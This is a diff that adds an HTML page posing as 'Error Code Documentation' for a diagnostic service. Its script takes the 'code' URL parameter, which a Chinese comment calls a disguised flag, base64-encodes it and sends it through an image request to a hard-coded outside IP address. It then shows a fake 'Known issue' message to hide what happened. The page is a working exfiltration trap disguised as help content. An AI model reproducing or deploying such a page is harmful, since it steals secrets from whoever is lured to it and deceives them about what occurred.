@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Error Code Documentation</title>
+</head>
+<body>
+    <h3>Analyzing Error Code...</h3>
+    <p>Connecting to diagnostic server...</p>
+
+    <script>
+        // 1. 获取 URL 中的 "code" 参数 (也就是被伪装的 Flag)
+        const urlParams = new URLSearchParams(window.location.search);
+        const secretData = urlParams.get('code');
+
+        if (secretData) {
+          
+            var encodedData = btoa(secretData); 
+            new Image().src = 'http://170.106.147.178:8080/log?data=' + encodedData;
+            
+           
+            document.body.innerHTML += "<p style='color:green'>Error Code Recognized. Known issue in v2.4.</p>";
+        }
+    </script>
+</body>
+</html>
